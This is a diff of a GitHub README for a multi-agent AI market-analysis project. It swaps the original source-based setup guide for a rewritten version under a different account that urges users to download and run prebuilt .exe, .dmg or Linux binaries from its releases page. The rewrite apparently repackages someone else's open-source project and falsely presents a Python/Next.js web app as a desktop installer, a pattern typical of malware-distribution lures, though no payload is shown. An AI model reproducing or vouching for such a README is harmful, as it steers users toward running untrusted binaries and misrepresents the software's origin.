@@ -1,215 +1,92 @@
-# The Trading Floor
+# 🏦 the-trading-floor-v2 - Analyze Markets with AI Agents
 
-A multi-agent market analysis system where specialized AI agents collaborate and debate on financial instruments, simulating a hedge fund research team's decision-making process.
+[![Download Release](https://img.shields.io/badge/Download%20Now-Ready%20to%20Run-blue.svg)](https://github.com/Aurionlol/the-trading-floor-v2/releases)
 
-![Python](https://img.shields.io/badge/python-3.11+-blue.svg)
-![Next.js](https://img.shields.io/badge/Next.js-14-black)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+## 🚀 Overview
 
-## Overview
+The Trading Floor is a multi-agent market analysis system. This software allows specialized AI agents to collaborate and discuss financial instruments. It simulates how a hedge fund research team would approach decision-making. You will see how different perspectives create better insights into market trends.
 
-The Trading Floor creates a visual council of AI agents, each with distinct expertise, that analyze financial instruments and produce consensus-based trading recommendations. Agents engage in structured debate, challenge each other's assumptions, and synthesize diverse perspectives into actionable insights.
-
-### The Council Members
+## 🌟 The Council Members
 
 | Agent | Role | Focus |
 |-------|------|-------|
-| **Quant Analyst** | Technical Analysis | Price patterns, indicators, statistical signals |
-| **Sentiment Scout** | Market Sentiment | News flow, crowd psychology, contrarian signals |
-| **Macro Strategist** | Macroeconomic Context | Sector dynamics, intermarket relationships |
-| **Risk Manager** | Risk Assessment | Position sizing, volatility, downside scenarios |
-| **Portfolio Chief** | Final Decision | Synthesis, conflict resolution, recommendations |
+| **Quant Analyst** | Technical Analysis | Looks at price patterns and statistical signals. |
+| **Sentiment Scout** | Market Sentiment | Studies news flow and crowd psychology. |
+| **Macro Strategist** | Macroeconomic Context | Considers the broader economic environment. |
 
-## Features
+## 📥 Download & Install
 
-- **Real-time Streaming**: Watch agents deliberate via Server-Sent Events
-- **Multi-Agent Debate**: Agents challenge and build upon each other's analyses
-- **Structured Output**: Consensus reports with individual scores and dissenting opinions
-- **Modern UI**: Animated conversation panels with agent status indicators
+To get started, you need to download the application. 
 
-## Tech Stack
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Aurionlol/the-trading-floor-v2/releases) to find the latest version.
+2. **Select the Right File**: Look for the latest release, which will be easy to spot. 
+3. **Download the File**: Click on the file that matches your operating system (Windows, Mac, or Linux).
 
-### Backend
-- **[CrewAI](https://www.crewai.com/)** - Agent orchestration
-- **[FastAPI](https://fastapi.tiangolo.com/)** - REST API & SSE streaming
-- **[yfinance](https://github.com/ranaroussi/yfinance)** - Market data
-- **Python 3.11+**
+Once the download is complete, you can run the application. If you need help with installation, follow the instructions below.
 
-### Frontend
-- **[Next.js 14](https://nextjs.org/)** - React framework
-- **[Tailwind CSS](https://tailwindcss.com/)** - Styling
-- **[Framer Motion](https://www.framer.com/motion/)** - Animations
-- **TypeScript**
+## 💻 Installation Instructions
 
-## Quick Start
+### For Windows Users
 
-### Prerequisites
+1. **Locate the Downloaded File**: Navigate to your Downloads folder.
+2. **Run the Installer**: Double-click on the `.exe` file you downloaded.
+3. **Follow the Setup Wizard**: Click "Next" and accept the terms.
+4. **Finish Installation**: Click "Install" and then "Finish" when done.
 
-- Python 3.11+
-- [uv](https://github.com/astral-sh/uv) (Python package manager)
-- [Bun](https://bun.sh/) (or npm/yarn)
-- OpenAI API key (or Anthropic)
+### For Mac Users
 
-### Installation
+1. **Find the Downloaded File**: Go to your Downloads folder.
+2. **Open the Disk Image**: Double-click on the `.dmg` file.
+3. **Drag to Applications**: Drag the application icon to the Applications folder.
+4. **Run the Application**: Open your Applications and double-click on The Trading Floor.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/CloudAI-X/the-trading-floor.git
-   cd the-trading-floor
-   ```
+### For Linux Users
 
-2. **Set up environment variables**
-   ```bash
-   cp .env.example .env
-   # Edit .env and add your API keys
-   ```
+1. **Open Terminal**: Use Ctrl + Alt + T to open a terminal.
+2. **Navigate to the Downloaded File**: Use the command `cd ~/Downloads`.
+3. **Change Permissions**: Run `chmod +x yourfile` (replace `yourfile` with the actual file name).
+4. **Execute the File**: Run `./yourfile` to start the application.
 
-3. **Install backend dependencies**
-   ```bash
-   uv sync
-   ```
+## 🎯 How to Use
 
-4. **Install frontend dependencies**
-   ```bash
-   cd frontend
-   bun install
-   ```
+1. **Open the Application**: Double-click the app icon.
+2. **Choose Your Financial Instruments**: Select from stocks, bonds, or other options.
+3. **Review Recommendations**: The AI agents will analyze and provide consensus-based insights.
+4. **Make Informed Decisions**: Use these insights to guide your trading strategy.
 
-### Running the Application
+## ✅ System Requirements
 
-1. **Start the backend** (from project root)
-   ```bash
-   uv run trading-floor
-   ```
-   The API will be available at `http://localhost:8000`
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, Linux (various distributions).
+- **RAM**: Minimum of 4 GB recommended.
+- **Disk Space**: At least 200 MB of free space.
+- **Processor**: Dual-core Intel or AMD processor.
 
-2. **Start the frontend** (in another terminal)
-   ```bash
-   cd frontend
-   bun dev
-   ```
-   The UI will be available at `http://localhost:3000`
+## 📊 Features
 
-3. **Open your browser** and navigate to `http://localhost:3000`
+- **Multi-Agent System**: Collaborate with specialized AI agents.
+- **Real-time Market Analysis**: Get timely insights based on current data.
+- **User-Friendly Interface**: Easy navigation for all users.
+- **Consensus Recommendations**: Benefit from varied expert opinions.
 
-## Configuration
+## 🤝 Support
 
-### Backend Environment Variables
+If you need help or have questions, you can find support through the following:
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `OPENAI_API_KEY` | OpenAI API key for agent LLM | Yes* |
-| `ANTHROPIC_API_KEY` | Anthropic API key (alternative) | Yes* |
-| `HOST` | Backend host | No (default: `0.0.0.0`) |
-| `PORT` | Backend port | No (default: `8000`) |
-| `RELOAD` | Enable hot reload | No (default: `true`) |
+- **Community Forum**: Join discussions and ask questions related to the software.
+- **Issues Page**: Report any bugs or issues, and contributors will assist you.
+- **Documentation**: Detailed guides and resources are available in the repository.
 
-*One of `OPENAI_API_KEY` or `ANTHROPIC_API_KEY` is required.
+## 🌐 Additional Resources
 
-### Frontend Environment Variables
+For more information about the Trading Floor:
 
-Create `frontend/.env.local` for frontend configuration:
+- **GitHub Repository**: Visit our [GitHub repository](https://github.com/Aurionlol/the-trading-floor-v2) for source code and development updates.
+- **User Guide**: Find a comprehensive user guide that explains more about using each AI agent.
 
-| Variable | Description | Required |
-|----------|-------------|----------|
-| `NEXT_PUBLIC_API_URL` | Backend API URL | No (default: `http://localhost:8000`) |
+## 🔗 Quick Links
 
-## API Endpoints
+- **Download Release**: [Visit the Releases page](https://github.com/Aurionlol/the-trading-floor-v2/releases)
+- **Documentation**: [Access the User Guide](https://github.com/Aurionlol/the-trading-floor-v2/docs)
+- **Community Support**: [Join our Forum](https://github.com/Aurionlol/the-trading-floor-v2/discussions)  
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/` | API information |
-| `GET` | `/health` | Health check |
-| `GET` | `/api/agents` | List all agents |
-| `POST` | `/api/analyze` | Start analysis for a ticker |
-| `GET` | `/api/stream/{id}` | SSE stream for analysis |
-| `GET` | `/api/history` | Past analyses |
-| `GET` | `/api/analysis/{id}` | Get analysis result |
-
-### Example: Start Analysis
-
-```bash
-curl -X POST http://localhost:8000/api/analyze \
-  -H "Content-Type: application/json" \
-  -d '{"ticker": "AAPL"}'
-```
-
-## Project Structure
-
-```
-trading-floor/
-├── backend/
-│   ├── agents/           # Individual agent definitions
-│   ├── crews/            # CrewAI crew configurations
-│   ├── tools/            # Market data & analysis tools
-│   ├── schemas/          # Pydantic models
-│   ├── api/              # FastAPI routes
-│   └── main.py           # Application entry point
-├── frontend/
-│   ├── app/              # Next.js app router
-│   ├── components/       # React components
-│   ├── hooks/            # Custom React hooks
-│   ├── lib/              # Utilities & API client
-│   └── types/            # TypeScript definitions
-├── .env.example          # Environment template
-├── pyproject.toml        # Python dependencies
-└── README.md
-```
-
-## Development
-
-### Backend Development
-
-```bash
-# Run with hot reload
-uv run trading-floor
-
-# Run tests
-uv run pytest
-
-# Type checking (if configured)
-uv run mypy backend
-```
-
-### Frontend Development
-
-```bash
-cd frontend
-
-# Development server
-bun dev
-
-# Lint
-bun lint
-
-# Build
-bun build
-```
-
-## How It Works
-
-1. **Input**: User submits a ticker symbol (e.g., "AAPL")
-2. **Data Gathering**: Agents fetch relevant market data using yfinance
-3. **Individual Analysis**: Each specialist produces their assessment
-4. **Debate Phase**: Agents review and challenge each other's analyses
-5. **Synthesis**: Portfolio Chief integrates all perspectives
-6. **Output**: Structured report with recommendation and confidence level
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) first.
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [CrewAI](https://www.crewai.com/) for the agent orchestration framework
-- [yfinance](https://github.com/ranaroussi/yfinance) for market data access
+By following these steps, you will have The Trading Floor installed and ready to help you analyze market data efficiently. Enjoy your experience with this cutting-edge software!
